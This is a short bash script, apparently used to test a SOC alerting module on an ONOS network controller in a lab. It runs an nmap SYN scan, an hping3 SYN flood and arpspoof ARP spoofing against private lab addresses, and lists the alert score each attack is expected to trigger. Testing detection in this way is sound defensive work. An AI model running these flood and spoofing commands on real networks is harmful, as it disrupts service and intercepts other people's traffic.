#!/bin/bash
echo "=== TEST SOC COMPLET ==="
echo "[1/3] PORT_SCAN (score +10)"
nmap -sS --min-rate 1000 -p 1-1024 192.168.1.20
sleep 5

echo "[2/3] SYN_FLOOD (score +30) — total >= 40 = MEDIUM"
timeout 10 hping3 -S --flood -p 80 192.168.1.20
sleep 5

echo "[3/3] ARP_SPOOFING (score +20) — total >= 60 = HIGH"
timeout 5 arpspoof -i h1-eth0 -t 192.168.1.20 192.168.1.30

echo "Score total attendu : 60+ → HIGH"
echo "Verifier les logs ONOS pour les alertes ThreatIntelligence"
